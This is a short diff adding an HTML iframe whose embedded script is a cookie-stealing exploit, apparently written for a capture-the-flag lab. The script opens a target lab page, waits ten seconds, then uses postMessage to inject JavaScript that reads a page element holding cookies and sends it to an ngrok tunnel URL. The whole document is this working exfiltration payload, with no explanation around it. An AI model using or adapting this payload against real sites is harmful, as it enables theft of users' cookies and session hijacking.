@@ -1,0 +1,13 @@
+<iframe
+    sandbox="allow-scripts allow-popups"
+    srcDoc="
+    <script>
+        const wind = window.open('https://3cd43ad4eaa6.pwnbox-lab.com/');
+        setTimeout(() => {
+            wind.postMessage(`
+                const cookies = document.getElementById('cookies').textContent;
+                fetch('https://ff8f-51-68-214-15.ngrok-free.app/leak-new-window?cookie=' + cookies);
+            `, '*');
+        }, 10000)
+    </script>
+"></iframe>
